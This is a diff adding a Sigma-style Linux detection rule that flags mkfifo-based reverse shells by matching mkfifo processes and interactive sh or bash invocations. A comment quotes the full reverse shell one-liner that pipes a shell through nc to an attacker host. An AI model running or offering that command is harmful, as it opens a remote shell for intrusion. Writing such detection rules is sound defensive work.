@@ -1,0 +1,30 @@
+title: Mkfifo Reverse Shell
+id: proc-lnx-mkfifo-revshell
+status: experimental
+description: Detects mkfifo-based reverse shell pattern (mkfifo /tmp/f; ... | /bin/sh -i)
+author: EDR-Linux
+date: 2026/03/08
+
+logsource:
+  category: process_creation
+  product: linux
+
+detection:
+  # mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker port > /tmp/f
+  selection:
+    Image|endswith: 'mkfifo'
+
+  # /bin/sh -i spawned as part of the pipe chain
+  selection_sh_i:
+    Image|endswith:
+      - '/sh'
+      - '/bash'
+    CommandLine|contains: ' -i'
+
+  condition: selection or selection_sh_i
+
+level: medium
+
+tags:
+  - attack.execution
+  - attack.t1059.004
